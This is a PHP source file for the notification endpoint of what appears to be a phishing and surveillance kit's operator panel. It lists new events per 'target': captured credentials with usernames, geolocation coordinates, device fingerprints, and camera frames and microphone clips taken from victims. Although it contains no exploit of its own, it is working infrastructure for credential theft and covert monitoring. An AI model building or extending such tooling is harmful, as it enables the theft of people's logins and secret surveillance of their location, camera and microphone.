<?php
/**
 * api/notifications.php — operator-facing notification feed.
 *
 *   GET    api/notifications.php                  → unread events since last seen
 *   POST   api/notifications.php  action=mark_read → reset "last seen" to now
 *
 * Events come from the events + media tables in SQLite instead of scanning
 * result.txt + captures/ + audio/ on every request.
 */

require_once __DIR__ . '/../auth.php';
require_once __DIR__ . '/../lib/store.php';

auth_boot();
header('Content-Type: application/json');

if (auth_user() === null) {
    http_response_code(401);
    echo json_encode(['ok' => false, 'error' => 'Not authenticated.']);
    exit;
}

const NOTIF_HARD_LIMIT  = 100;
const NOTIF_PREVIEW_LEN = 140;

/* ------------------------------------------------------------------ *
 *  State via kv table
 * ------------------------------------------------------------------ */

function notif_last_seen(): int {
    $v = store_kv_get('notif_last_seen_at');
    return $v !== null ? (int) $v : 0;
}

function notif_mark_seen(int $ts): void {
    store_kv_set('notif_last_seen_at', (string) $ts);
}

/* ------------------------------------------------------------------ *
 *  Preview helpers
 * ------------------------------------------------------------------ */

function notif_make_preview(string $kind, array $obj): string {
    if ($kind === 'cred') {
        $username = '';
        foreach (['username', 'user', 'email', 'login', 'inp-username', 'name'] as $k) {
            if (!empty($obj[$k])) { $username = (string) $obj[$k]; break; }
        }
        if ($username === '') return 'captured credentials';
        return 'captured credentials for ' . notif_truncate($username, 40);
    }
    if ($kind === 'geo') {
        if (isset($obj['error']))             return 'geolocation denied';
        if (isset($obj['lat'], $obj['lon']))  return sprintf('geolocation %.4f, %.4f', $obj['lat'], $obj['lon']);
        return 'geolocation event';
    }
    if ($kind === 'device') {
        $ua = (string) ($obj['user_agent'] ?? '');
        $platform = (string) ($obj['platform'] ?? '');
        if ($platform !== '' || $ua !== '') {
            return 'device fingerprint · ' . notif_truncate(trim($platform . ' ' . $ua), 80);
        }
        return 'device fingerprint';
    }
    if ($kind === 'consent') {
        $decision = strtolower((string) ($obj['decision'] ?? ''));
        if ($decision === 'granted') return 'consent notice accepted';
        if ($decision === 'declined') return 'consent notice declined';
        return 'consent event';
    }
    return $kind . ' event';
}

function notif_truncate(string $s, int $max): string {
    if (mb_strlen($s) <= $max) return $s;
    return mb_substr($s, 0, $max - 1) . '…';
}

/* ------------------------------------------------------------------ *
 *  Routing
 * ------------------------------------------------------------------ */

$last_seen = notif_last_seen();

// Seed on first ever GET so existing history doesn't flood the bell.
if ($last_seen === 0) {
    $last_seen = time();
    notif_mark_seen($last_seen);
}

if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    // Gather text events from the events table.
    $text_events = store_event_list(null, null, $last_seen);
    // Gather media events from the media table.
    $media_rows  = store_media_list(null, null, $last_seen);

    $events = [];
    foreach ($text_events as $row) {
        $events[] = [
            'target'  => $row['target_slug'],
            'kind'    => $row['kind'],
            'ts'      => $row['captured_at'],
            'preview' => notif_make_preview($row['kind'], $row['payload']),
        ];
    }
    foreach ($media_rows as $row) {
        $label = $row['kind'] === 'camera' ? 'captured a camera frame' : 'captured a microphone clip';
        $events[] = [
            'target'  => $row['target_slug'],
            'kind'    => $row['kind'],
            'ts'      => $row['captured_at'],
            'preview' => $label . ' (' . $row['filename'] . ')',
        ];
    }

    // Newest first.
    usort($events, function ($a, $b) {
        if ($a['ts'] !== $b['ts']) return $b['ts'] <=> $a['ts'];
        $r = strcmp($a['target'], $b['target']);
        if ($r !== 0) return $r;
        return strcmp($a['kind'], $b['kind']);
    });

    $total = count($events);
    if ($total > NOTIF_HARD_LIMIT) {
        $events = array_slice($events, 0, NOTIF_HARD_LIMIT);
    }

    echo json_encode([
        'ok'           => true,
        'count'        => $total,
        'shown'        => count($events),
        'limit'        => NOTIF_HARD_LIMIT,
        'last_seen_at' => $last_seen,
        'events'       => $events,
    ]);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';
    if ($action === 'mark_read') {
        $now = time();
        notif_mark_seen($now);
        echo json_encode(['ok' => true, 'count' => 0, 'last_seen_at' => $now]);
        exit;
    }
    http_response_code(400);
    echo json_encode(['ok' => false, 'error' => 'Unknown action.']);
    exit;
}

http_response_code(405);
echo json_encode(['ok' => false, 'error' => 'Method not allowed.']);
